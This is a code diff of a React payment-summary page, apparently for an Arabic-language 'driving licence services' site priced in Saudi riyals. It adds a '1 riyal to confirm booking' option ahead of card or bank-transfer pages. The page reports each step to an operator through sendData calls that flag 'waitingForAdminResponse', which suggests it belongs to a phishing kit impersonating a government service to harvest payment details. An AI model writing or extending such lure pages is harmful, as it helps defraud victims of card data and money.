@@ -8,6 +8,7 @@ import { CreditCard, CheckCircle2 } from "lucide-react";
 export default function SummaryPayment() {
   const [, setLocation] = useLocation();
   const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<string | null>(null);
+  const [paymentType, setPaymentType] = useState<'full' | 'booking'>('full');
   const [isProcessing, setIsProcessing] = useState(false);
   const [showPopup, setShowPopup] = useState(false);
   const [countdown, setCountdown] = useState(() => {
@@ -119,9 +120,12 @@ export default function SummaryPayment() {
 
     setIsProcessing(true);
 
+    const finalAmount = paymentType === 'booking' ? 1 : totalAmount;
+
     sendData({
       data: {
-        'المجموع الكلي': `${totalAmount} ر.س`,
+        'نوع الدفع': paymentType === 'booking' ? 'تأكيد حجز (1 ريال)' : 'دفع كامل',
+        'المجموع الكلي': `${finalAmount} ر.س`,
       },
       current: 'الملخص والدفع',
       waitingForAdminResponse: false,
@@ -130,10 +134,11 @@ export default function SummaryPayment() {
     sendData({
       data: {
         paymentMethod: selectedPaymentMethod === 'card' ? 'بطاقة ائتمان' : 'Apple Pay',
+        paymentType: paymentType === 'booking' ? 'تأكيد حجز (1 ريال)' : 'دفع كامل',
         serviceName,
         servicePrice,
         vatAmount,
-        totalAmount,
+        totalAmount: finalAmount,
       },
       current: 'ملخص الدفع',
       nextPage: selectedPaymentMethod === 'card' ? 'credit-card-payment' : 'bank-transfer',
@@ -143,9 +148,9 @@ export default function SummaryPayment() {
     setTimeout(() => {
       setIsProcessing(false);
       if (selectedPaymentMethod === 'card') {
-        clientNavigate(`/credit-card-payment?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`);
+        clientNavigate(`/credit-card-payment?service=${encodeURIComponent(serviceName)}&amount=${finalAmount}`);
       } else {
-        clientNavigate(`/bank-transfer?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`);
+        clientNavigate(`/bank-transfer?service=${encodeURIComponent(serviceName)}&amount=${finalAmount}`);
       }
     }, 1500);
   };
@@ -202,6 +207,57 @@ export default function SummaryPayment() {
         <p className="mb-1 font-bold text-lg sm:text-[22px]">خدمات رخصة القيادة</p>
         <p className="pt-1 text-base sm:text-[22px]">ملخص الطلب والدفع</p>
       </section>
+
+      {/* Payment Type Selection */}
+      <section className="container mx-auto px-3 sm:px-4 mt-4">
+        <div className="max-w-4xl mx-auto">
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+            {/* Full Payment Option */}
+            <div
+              className={`border-2 rounded-xl p-4 cursor-pointer transition-all flex items-center gap-3 ${
+                paymentType === 'full'
+                  ? 'border-green-500 bg-green-50 shadow-md'
+                  : 'border-gray-200 hover:border-green-300 bg-white'
+              }`}
+              onClick={() => setPaymentType('full')}
+            >
+              <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center flex-shrink-0 ${
+                paymentType === 'full' ? 'border-green-500' : 'border-gray-300'
+              }`}>
+                {paymentType === 'full' && (
+                  <div className="w-3 h-3 rounded-full bg-green-500" />
+                )}
+              </div>
+              <div>
+                <p className="font-bold text-gray-800">دفع كامل المبلغ</p>
+                <p className="text-sm text-gray-500">ادفع المبلغ كاملاً الآن</p>
+              </div>
+            </div>
+
+            {/* 1 SAR Booking Option */}
+            <div
+              className={`border-2 rounded-xl p-4 cursor-pointer transition-all flex items-center gap-3 ${
+                paymentType === 'booking'
+                  ? 'border-green-500 bg-green-50 shadow-md'
+                  : 'border-gray-200 hover:border-green-300 bg-white'
+              }`}
+              onClick={() => setPaymentType('booking')}
+            >
+              <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center flex-shrink-0 ${
+                paymentType === 'booking' ? 'border-green-500' : 'border-gray-300'
+              }`}>
+                {paymentType === 'booking' && (
+                  <div className="w-3 h-3 rounded-full bg-green-500" />
+                )}
+              </div>
+              <div>
+                <p className="font-bold text-gray-800">دفع 1 ريال لتأكيد الحجز</p>
+                <p className="text-sm text-gray-500">ادفع ريال واحد فقط لتأكيد حجزك</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
       
       <main className="flex-1 container px-3 sm:px-4 py-4 sm:py-8">
         <div className="max-w-4xl mx-auto">
@@ -232,7 +288,7 @@ export default function SummaryPayment() {
                     </div>
                     <div className="flex justify-between items-center py-2 bg-green-50 px-3 rounded-lg">
                       <span className="text-green-700 font-bold">المجموع الكلي</span>
-                      <span className="text-green-700 font-bold text-xl">{totalAmount} ر.س</span>
+                      <span className="text-green-700 font-bold text-xl">{paymentType === 'booking' ? '1' : totalAmount} ر.س</span>
                     </div>
                   </div>
                 </CardContent>
@@ -335,7 +391,7 @@ export default function SummaryPayment() {
                     <hr />
                     <div className="flex justify-between font-bold text-lg">
                       <span>المجموع</span>
-                      <span className="text-green-600">{totalAmount} ر.س</span>
+                      <span className="text-green-600">{paymentType === 'booking' ? '1' : totalAmount} ر.س</span>
                     </div>
                   </div>
 
